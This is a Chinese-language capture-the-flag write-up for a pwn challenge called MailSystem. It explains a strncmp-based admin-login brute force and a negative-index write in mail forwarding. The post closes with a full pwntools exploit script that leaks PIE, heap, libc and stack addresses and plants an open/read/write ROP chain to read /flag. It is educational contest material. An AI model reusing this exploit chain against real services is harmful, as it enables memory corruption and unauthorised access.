---
title: 软件安全赛 -pwn MailSystem
published: 2026-03-14
description: "赛后用AI才写出来"
image: ''
tags: [PWN，比赛]
category: PWN
draft: false
---

# 软件安全赛 -pwn MailSystem

### 关键结构

```c
struct User {
    char inbox_mail[256];      // 0x000 (+0)   : 收件箱内容
    uint64_t draft_size;       // 0x100 (+256) : 草稿箱长度
    char draft_mail[256];      // 0x110 (+272) : 草稿箱内容
    uint64_t inbox_size;       // 0x210 (+528) : 收件箱长度

    char username[40];         // 0x298 (+664) : 用户名 (根据 login 函数推断)
    char password[32];         // 0x2C0 (+704) : 密码
    // ...
    uint64_t unread_flag;      // 0x308 (+776) : 是否有未读邮件的标志位 (1为有，0为无)
};
```

### 漏洞点

- admin登陆验证

  ```c
  __int64 __fastcall is_admin(char *s2, char *s1)
  {
    if ( strcmp(s2, (const char *)qword_70C0 + 50) )
      return 0;
    if ( !strncmp(s1, (const char *)qword_70C0 + 104, 0x10u) )
    {
      puts("Welcome admin!");
      return 1;
    }
    else
    {
      puts("Wrong password for admin!");
      return 0;
    }
  }
  
  
  
  
  int sub_163B()
  {
    char *v0; // rax
    int i; // [rsp+4h] [rbp-Ch]
    FILE *stream; // [rsp+8h] [rbp-8h]
  
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    sub_15D2();
    for ( i = 0; i <= 11; ++i )
      qword_70E0[34 * i] = time(0);
    s_0 = malloc(0x400u);
    memset(s_0, 0, 0x400u);
    if ( !s_0 )
    {
      puts("malloc error");
      exit(-1);
    }
    v0 = (char *)s_0 + 50;
    *(_DWORD *)((char *)s_0 + 50) = 1768776801;
    *((_WORD *)v0 + 2) = 110;
    stream = fopen("/dev/urandom", "rb");
    if ( !stream )
    {
      puts("fopen error");
      exit(-1);
    }
    fread((char *)s_0 + 104, 1u, 0x10u, stream);
    return fclose(stream);
  }
  ```

  我们可以知道，admin的密码是从` stream = fopen("/dev/urandom", "rb");`读出来的真随机数，我们没有办法进行预测，但是漏洞出现在验证函数中，对于密码的验证使用的是strncmp，因此当这个真随机数第一个字节是`\x00`的时候我们只用输入`\x00`就可以通过验证，因此我们可以对于admin登陆进行爆破

- admin转发邮件

  ```c
  unsigned __int64 user_to_user_email()
  {
    int n12; // [rsp+Ch] [rbp-34h] BYREF
    int n12_1; // [rsp+10h] [rbp-30h] BYREF
    int n2; // [rsp+14h] [rbp-2Ch] BYREF
    size_t n; // [rsp+18h] [rbp-28h]
    size_t n256; // [rsp+20h] [rbp-20h]
    void *src_1; // [rsp+28h] [rbp-18h]
    void *src; // [rsp+30h] [rbp-10h]
    unsigned __int64 v8; // [rsp+38h] [rbp-8h]
  
    v8 = __readfsqword(0x28u);
    printf("Enter source user ID (whose mail to forward): (1-12) ");
    if ( (unsigned int)__isoc99_scanf("%d", &n12) != 1 )
    {
      puts("Invalid source user ID!");
      while ( getchar() != 10 )
        ;
      goto LABEL_40;
    }
    printf("Enter destination user ID (1-12): ");
    if ( (unsigned int)__isoc99_scanf("%d", &n12_1) != 1 )
    {
      puts("Invalid destination user ID!");
      while ( getchar() != 10 )
        ;
      goto LABEL_40;
    }
    if ( n12 > 12 )
    {
      puts("Source user ID out of range!");
      putchar(10);
    }
    else if ( qword_7060[n12 - 1] )
    {
      if ( n12_1 > 12 )
      {
        puts("Destination user ID out of range!");
        putchar(10);
      }
      else if ( qword_7060[n12_1 - 1] )
      {
        if ( !*(_QWORD *)(qword_7060[n12_1 - 1] + 776LL)
          || (printf("Warning: User %d already has unread mail. Overwrite? (y/n): ", n12_1),
              __isoc99_scanf(" %c", &n2),
              (_BYTE)n2 == 121)
          || (_BYTE)n2 == 89 )
        {
          if ( n12 > 12 )
          {
  LABEL_40:
            putchar(10);
            return v8 - __readfsqword(0x28u);
          }
          puts("Which mail would you like to forward?");
          puts("1. User's draft");
          puts("2. User's inbox mail");
          printf("Your choice: ");
          if ( (unsigned int)__isoc99_scanf("%d", &n2) != 1 )
          {
            puts("Invalid input!");
            while ( getchar() != 10 )
              ;
            goto LABEL_40;
          }
          if ( n12_1 <= 12 )
            *(_QWORD *)(qword_7060[n12_1 - 1] + 776LL) = 1;
          if ( n2 == 1 )
          {
            if ( n12_1 <= 12 )
            {
              n = *(_QWORD *)(qword_7060[n12 - 1] + 256LL);
              if ( n > 0x100 )
                n = 256;
              src = (void *)(qword_7060[n12 - 1] + 272LL);
              memcpy((void *)qword_7060[n12_1 - 1], src, n);
              *(_QWORD *)(qword_7060[n12_1 - 1] + 528LL) = n;
            }
          }
          else
          {
            if ( n2 != 2 )
            {
              puts("Invalid choice!");
              putchar(10);
              return v8 - __readfsqword(0x28u);
            }
            if ( n12_1 <= 12 )
            {
              n256 = *(_QWORD *)(qword_7060[n12 - 1] + 528LL);
              if ( n256 > 0x100 )
                n256 = 256;
              src_1 = (void *)qword_7060[n12 - 1];
              memcpy((void *)qword_7060[n12_1 - 1], src_1, n256);
              *(_QWORD *)(qword_7060[n12_1 - 1] + 528LL) = n256;
            }
          }
          printf("Mail forwarded from index %d to index %d!\n", n12, n12_1);
        }
        else
        {
          puts("Forwarding cancelled.");
          putchar(10);
        }
      }
      else
      {
        printf("Destination user %d does not exist!\n", n12_1);
        putchar(10);
      }
    }
    else
    {
      printf("Source user %d does not exist!\n", n12);
      putchar(10);
    }
    return v8 - __readfsqword(0x28u);
  }
  ```

  我们可以看到，转发邮件的时候对于用户的索引仅仅做了` if ( n12 > 12 )`的检查，n12是有符号整数，因此我们可以通过负索引修改bss段的内容

  ```c
  .data:0000000000007000                                   ; ===========================================================================
  .data:0000000000007000
  .data:0000000000007000                                   ; Segment type: Pure data
  .data:0000000000007000                                   ; Segment permissions: Read/Write
  .data:0000000000007000                                   _data segment qword public 'DATA' use64
  .data:0000000000007000                                   assume cs:_data
  .data:0000000000007000                                   ;org 7000h
  .data:0000000000007000 00                                db    0
  .data:0000000000007001 00                                db    0
  .data:0000000000007002 00                                db    0
  .data:0000000000007003 00                                db    0
  .data:0000000000007004 00                                db    0
  .data:0000000000007005 00                                db    0
  .data:0000000000007006 00                                db    0
  .data:0000000000007007 00                                db    0
  .data:0000000000007008                                   ; void *off_7008
  .data:0000000000007008 08 70 00 00 00 00 00 00           off_7008 dq offset off_7008             ; DATA XREF: sub_13E0+1B↑r
  .data:0000000000007008                                                                           ; .data:off_7008↓o
  .data:0000000000007008                                   _data ends
  .data:0000000000007008
  LOAD:0000000000007010                                   ; ===========================================================================
  LOAD:0000000000007010
  LOAD:0000000000007010                                   ; Segment type: Pure data
  LOAD:0000000000007010                                   ; Segment permissions: Read/Write
  LOAD:0000000000007010                                   LOAD segment mempage public 'DATA' use64
  LOAD:0000000000007010                                   assume cs:LOAD
  LOAD:0000000000007010                                   ;org 7010h
  LOAD:0000000000007010 ??                                unk_7010 db    ? ;                      ; DATA XREF: sub_1370↑o
  LOAD:0000000000007010                                                                           ; sub_1370+7↑o
  LOAD:0000000000007010                                                                           ; sub_13A0↑o
  LOAD:0000000000007010                                                                           ; sub_13A0+7↑o
  LOAD:0000000000007011 ??                                db    ? ;
  LOAD:0000000000007012 ??                                db    ? ;
  LOAD:0000000000007013 ??                                db    ? ;
  LOAD:0000000000007014 ??                                db    ? ;
  LOAD:0000000000007015 ??                                db    ? ;
  LOAD:0000000000007016 ??                                db    ? ;
  LOAD:0000000000007017 ??                                db    ? ;
  LOAD:0000000000007018 ??                                db    ? ;
  LOAD:0000000000007019 ??                                db    ? ;
  LOAD:000000000000701A ??                                db    ? ;
  LOAD:000000000000701B ??                                db    ? ;
  LOAD:000000000000701C ??                                db    ? ;
  LOAD:000000000000701D ??                                db    ? ;
  LOAD:000000000000701E ??                                db    ? ;
  LOAD:000000000000701F ??                                db    ? ;
  LOAD:000000000000701F                                   LOAD ends
  LOAD:000000000000701F
  .bss:0000000000007020                                   ; ===========================================================================
  .bss:0000000000007020
  .bss:0000000000007020                                   ; Segment type: Uninitialized
  .bss:0000000000007020                                   ; Segment permissions: Read/Write
  .bss:0000000000007020                                   _bss segment align_32 public 'BSS' use64
  .bss:0000000000007020                                   assume cs:_bss
  .bss:0000000000007020                                   ;org 7020h
  .bss:0000000000007020                                   assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
  .bss:0000000000007020                                   public stdout
  .bss:0000000000007020                                   ; FILE *stdout
  .bss:0000000000007020 ?? ?? ?? ?? ?? ?? ?? ??           stdout dq ?                             ; DATA XREF: sub_163B+2A↑r
  .bss:0000000000007020                                                                           ; LOAD:0000000000008660↓o
  .bss:0000000000007020                                                                           ; Copy of shared data
  .bss:0000000000007028 ?? ?? ?? ?? ?? ?? ?? ??           align 10h
  .bss:0000000000007030                                   public stdin
  .bss:0000000000007030                                   ; FILE *stdin
  .bss:0000000000007030 ?? ?? ?? ?? ?? ?? ?? ??           stdin dq ?                              ; DATA XREF: sub_163B+C↑r
  .bss:0000000000007030                                                                           ; LOAD:0000000000008690↓o
  .bss:0000000000007030                                                                           ; Copy of shared data
  .bss:0000000000007038 ?? ?? ?? ?? ?? ?? ?? ??           align 20h
  .bss:0000000000007040                                   public stderr
  .bss:0000000000007040                                   ; FILE *stderr
  .bss:0000000000007040 ?? ?? ?? ?? ?? ?? ?? ??           stderr dq ?                             ; DATA XREF: sub_163B+48↑r
  .bss:0000000000007040                                                                           ; LOAD:00000000000086C0↓o
  .bss:0000000000007040                                                                           ; Copy of shared data
  .bss:0000000000007048 ??                                byte_7048 db ?                          ; DATA XREF: sub_13E0+4↑r
  .bss:0000000000007048                                                                           ; sub_13E0+2C↑w
  .bss:0000000000007049 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??…    align 20h
  .bss:0000000000007060                                   ; _QWORD qword_7060[12]
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??     qword_7060 dq 0Ch dup(?)                ; DATA XREF: sub_1429+A7↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; sub_1429+CB↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; register+1B↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; register+A6↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; register+C6↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; register+E7↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; register+146↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; sub_2040+BE↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; sub_2040+193↑o
  .bss:0000000000007060 ?? ?? ?? ?? ?? ??                                                         ; sub_2040+244↑o
  .bss:0000000000007060                                                                           ; sub_2040+277↑o
  .bss:0000000000007060                                                                           ; sub_2040+2A4↑o
  .bss:0000000000007060                                                                           ; change_user_info+97↑o
  .bss:0000000000007060                                                                           ; change_user_info+DF↑o
  .bss:0000000000007060                                                                           ; delete_user+97↑o
  .bss:0000000000007060                                                                           ; delete_user+13E↑o ...
  .bss:00000000000070C0                                   ; void *s_0
  .bss:00000000000070C0 ?? ?? ?? ?? ?? ?? ?? ??           s_0 dq ?                                ; DATA XREF: sub_163B+BC↑w
  .bss:00000000000070C0                                                                           ; sub_163B+C3↑r
  .bss:00000000000070C0                                                                           ; sub_163B+DC↑r
  .bss:00000000000070C0                                                                           ; sub_163B:loc_173C↑r
  .bss:00000000000070C0                                                                           ; sub_163B:loc_1790↑r
  .bss:00000000000070C0                                                                           ; is_admin+14↑r
  .bss:00000000000070C0                                                                           ; is_admin+32↑r
  .bss:00000000000070C8 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??…    align 20h
  .bss:00000000000070E0                                   ; _QWORD qword_70E0[408]
  .bss:00000000000070E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??     qword_70E0 dq 198h dup(?)               ; DATA XREF: sub_1429+34↑o
  .bss:00000000000070E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; sub_163B+9D↑o
  .bss:00000000000070E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??                                             ; sub_2040+14B↑o
  .bss:00000000000070E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??     _bss ends
  .bss:00000000000070E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??…
  LOAD:0000000000008000                                   ; ELF Dynamic Information
  LOAD:0000000000008000                                   ; ========
      
      
      
      
      
      
      
      
  pwndbg> x/20gx 0x5a81c01bc000+0x7000
  0x5a81c01c3000: 0x0000000000000000      0x00005a81c01c3008
  0x5a81c01c3010: 0x0000000000000000      0x0000000000000000
  0x5a81c01c3020 <stdout>:        0x00007b0004000780      0x0000000000000000
  0x5a81c01c3030 <stdin>: 0x00007b0003fffaa0      0x0000000000000000
  0x5a81c01c3040 <stderr>:        0x00007b00040006a0      0x0000000000000000
  0x5a81c01c3050: 0x0000000000000000      0x0000000000000000
  0x5a81c01c3060: 0x00005a81d6874a70      0x00005a81d6874e90
  0x5a81c01c3070: 0x00005a81d68752b0      0x00005a81d68756d0
  0x5a81c01c3080: 0x00005a81d6875af0      0x00005a81d6875f10
  0x5a81c01c3090: 0x00005a81d6876330      0x00005a81d6876750
  ```

  我们看pwndbg的输出可以发现有一个指向自己的指针，这将是我们研究的重点。

  我们可以通过转发邮件来读入或者写入指针的内容，但存在大小限制		[pointer + 0x210]处的大小限制我们读取的长度，而`0x00005a81c01c3008`处的大小为0，

  我的思路是通过转发内容来修改其长度

  1. 首先向`0x00005a81c01c3008`中发送长度为1，内容为`\x00`的邮件，将其修改为`0x00005a81c01c3000`
  2. 我们第二次向索引为-10（0x00005a81c01c3008）处转发`payload = p64(0x00005a81c01c3000)`,将我们原来修改的指针修改回来，同时将索引-10处的size大小扩大为9字节。这是我们突破读取限制，可以成功泄露PIE，libc，heap与stack的关键
  3. 向`0x00005a81c01c3000`写入`0x00005a81c01c3000`可以泄露PIE
  4. 向`0x00005a81c01c3000`写入`0x5a81c01c3060`可以泄露heap
  5. 向`0x00005a81c01c3000`写入`puts@got`可以泄露libc
  6. 向`0x00005a81c01c3000`写入`environment`可以泄露stack

  如此我们前置工作完成了

  接下来是向heap1中写入我们的ROPchain，向`0x00005a81c01c3000`写入返回地址，将user1的mail转发给索引-11，成功改写rbp后的栈中写入ORWchain

  SUCCESS！



![image-20260315223158860](C:\Users\hua\AppData\Roaming\Typora\typora-user-images\image-20260315223158860.png)



### EXP

ps:纯纯屎山代码

```python
#!/usr/bin/env python3

from pwn import *
import ctypes 

exe = ELF("pwn_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "error"
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def sa(msg, data):
    r.sendafter(msg, data)

def sla(msg, data):
    r.sendlineafter(msg, data)

def register(name, password):
    """注册普通用户"""
    sla(b"Your choice: ", b"2")
    sla(b"Input your name: ", name)
    sla(b"Input your password: ", password)

def login(name, password):
    sla(b"Your choice: ", b"1")
    sla(b"Input your name: ", name)
    sla(b"Input your password: ", password)

def exit_cmd():
    sla(b"Your choice: ", b"3")

def write_mail(size, content):
    sla(b"Your choice: ", b"1")
    sla(b"How many bytes do you want to write? (1-256): ", str(size).encode())
    sa(b"Write your mail content (max", content)

def read_draft():
    sla(b"Your choice: ", b"2")
    sla(b"Your choice: ", b"1")
    r.sendlineafter(b"Your choice: ", b"3")

def read_inbox():
    sla(b"Your choice: ", b"2")
    sla(b"Your choice: ", b"2")

def send_mail(target_id, overwrite=False):
    sla(b"Your choice: ", b"3")
    sla(b"(input user ID 1-12)\n", str(target_id).encode())
    if overwrite:
        sla(b"Overwrite? (y/n): ", b"y")

def user_logout():
    sla(b"Your choice: ", b"4")
    
def admin_change_username(uid, new_name):
    sla(b"Your choice: ", b"1")
    sla(b"Enter user ID to modify (1-12): ", str(uid).encode())
    sla(b"Your choice: ", b"1")
    sla(b"Enter new username: ", new_name)

def admin_change_password(uid, new_password):
    sla(b"Your choice: ", b"1")
    sla(b"Enter user ID to modify (1-12): ", str(uid).encode())
    sla(b"Your choice: ", b"2")
    sla(b"Enter new password: ", new_password)

def admin_delete_user(uid, confirm=True):
    sla(b"Your choice: ", b"2")
    sla(b"Enter user ID to delete (1-12): ", str(uid).encode())
    if confirm:
        sla(b"Are you sure you want to delete user", b"y")
    else:
        sla(b"Are you sure you want to delete user", b"n")

def admin_mail_to_user(uid, size, content, overwrite=False):
    sla(b"Your choice: ", b"3")
    sla(b"Enter user ID to send mail to : (1-12)", str(uid).encode())
    sla(b"How many bytes do you want to write?", str(size).encode())
    sa(b"Enter mail content (max", content)
    if overwrite:
        sla(b"Overwrite? (y/n): ", b"y")

def admin_forward_mail(src_uid, dst_uid, mail_type, overwrite=False):
    sla(b"Your choice: ", b"4")
    sla(b"Enter source user ID", str(src_uid).encode())
    sla(b"Enter destination user ID", str(dst_uid).encode())
    if overwrite:
         sla(b"Overwrite? (y/n): ", b"y")
    sla(b"Your choice: ", str(mail_type).encode())

def admin_logout():
    sla(b"Your choice: ", b"5")

def kill(uid):
    for i in range(5):
        write_mail(0x100, b"test")
        if i==0:
            send_mail(uid,0)
        elif i<4:
            send_mail(uid,1)
        else:
            send_mail(uid,0)
            r.recvuntil(b"Account has been banned!")
            log.success("Account successfully banned and kicked to main menu!")
            r.recvuntil(b"Returning to login menu...")
    
def vmread(idx,address):
    
    login(name[idx-1],name[idx-1])
    write_mail(256,p64(PIE-0x8)+p64(PIE))
    send_mail(idx,0)
    user_logout()
    login(b'admin',b'\x00')
    admin_forward_mail(idx,-11,2,True)
    admin_logout()
    
    
    
    login(name[idx-1],name[idx-1])
    write_mail(256,p64(address))
    send_mail(idx,1)
    user_logout()
        
    login(b'admin',b'\x00')
    admin_forward_mail(idx,-10,2,True)
    
    
    
    admin_forward_mail(-10,idx,2,True)
    admin_logout()
    login(name[idx-1],name[idx-1])
    read_inbox()
    r.recvuntil('Inbox (new mail):\n')
    heap = u64(r.recv(6).ljust(8, b"\x00"))
    log.success(f"heap: {hex(heap)}")
    sla(b"Your choice: ", b"3")
    user_logout()
    return heap

times = 0

while True:
    times += 1
    log.success(f"Try {times}")
    r = conn()
    login(b'admin',b'\x00')
    if b'Welcome admin!' in r.recvline():
        log.success("Login successfully!")
        context.log_level = "debug"
        r.sendlineafter(b"Your choice: ", b"5")
        name = [b'1',b'12',b'123', b'1234', b'12345', b'123456', b'1234567', b'12345678', b'123456789', b'1234567890',b'12345678901',b'123456789012']
        
        for i in range(8):
            register(name[i], name[i])
            
        # gdb.attach(r,'b *(0x321E + PIE-0x7008)')
        
        login(name[0],name[0])
        write_mail(256,b"\x00")
        send_mail(1,0)
        user_logout()
        
        login(b'admin',b'\x00')
        admin_forward_mail(1,-10,2,False)
        admin_logout()
        
        login(name[0],name[0])
        write_mail(256,b"\x08"*9)
        send_mail(1,1)
        user_logout()  
        
        login(b'admin',b'\x00')
        admin_forward_mail(1,-10,2,False)

              
        admin_forward_mail(-10,1,2,True)
        admin_logout()
        login(name[0],name[0])
        read_inbox()
        r.recvuntil('Inbox (new mail):\n')
        PIE = u64(r.recv(6).ljust(8, b"\x00"))
        log.success(f"PIE: {hex(PIE)}")
        exit_got = PIE + 0x5fd0 - 0x6008
        log.success(f"exit_got: {hex(exit_got)}")
        heap_addr = PIE + 0x58
        sla(b"Your choice: ", b"3")
        user_logout()
        ###
        login(name[1],name[1])
        write_mail(256,p64(PIE-0x8))
        send_mail(2,0)
        user_logout()
        
        login(b'admin',b'\x00')
        admin_forward_mail(2,-10,2,True)
        admin_logout()
        
        login(name[1],name[1])
        write_mail(256,p64(PIE-0x8) + p64(PIE))
        send_mail(2,1)
        user_logout() 
        
        login(b'admin',b'\x00')
        admin_forward_mail(2,-10,2,True)
        admin_logout()
        
        login(name[2],name[2])
        write_mail(256,p64(heap_addr))
        send_mail(3,0)
        user_logout()
        
        login(b'admin',b'\x00')
        admin_forward_mail(3,-10,2,True)
        
        admin_forward_mail(-10,3,2,True)
        admin_logout()
        login(name[2],name[2])
        read_inbox()
        r.recvuntil('Inbox (new mail):\n')
        heap = u64(r.recv(6).ljust(8, b"\x00"))
        log.success(f"heap: {hex(heap)}")
        sla(b"Your choice: ", b"3")
        user_logout()
        
        login(b'admin',b'\x00')
        admin_forward_mail(-3,3,1,False)
        admin_logout()
        login(name[2],name[2])
        read_inbox()
        r.recvuntil('Inbox (new mail):\n')
        libc.address = u64(r.recv(6).ljust(8, b"\x00")) - (0x75e9f7ace803 - 0x75e9f78b3000)
        log.success(f"libc: {hex(libc.address)}")
        pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
        pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
        pop_rdx = libc.search(asm('pop rdx; pop r12; ret')).__next__()
        sla(b"Your choice: ", b"3")
        user_logout()
        
        
        
        stack = vmread(4,libc.sym['environ'])
        
        # heap ROPchain
        login(name[0],name[0])
        flag_addr = heap + 0xa8
        payload = flat([
        pop_rdi, flag_addr,
        pop_rsi, 0,
        libc.sym['open'],
        pop_rdi, 3,               
        pop_rsi, flag_addr+0x100,
        pop_rdx, 0x100,0,
        libc.sym['read'],
        pop_rdi, 1,              
        pop_rsi, flag_addr+0x100,
        pop_rdx, 0x100,0,
        libc.sym['write'],
        b'/flag\x00'
    ])
        write_mail(256,payload)
        send_mail(1,0)
        user_logout()
        
        #stack writein
        
        login(name[4],name[4])
        write_mail(256,p64(stack + 0x7ffca9bc6528 - 0x7ffca9bc6708))
        send_mail(5,0)
        user_logout()
        
        login(b'admin',b'\x00')
        admin_forward_mail(5,-11,2,True)
        admin_logout()
        
        login(b'admin',b'\x00')

        admin_forward_mail(1,-11,2,True)
             
        r.interactive()
        break
        
    r.close()
```

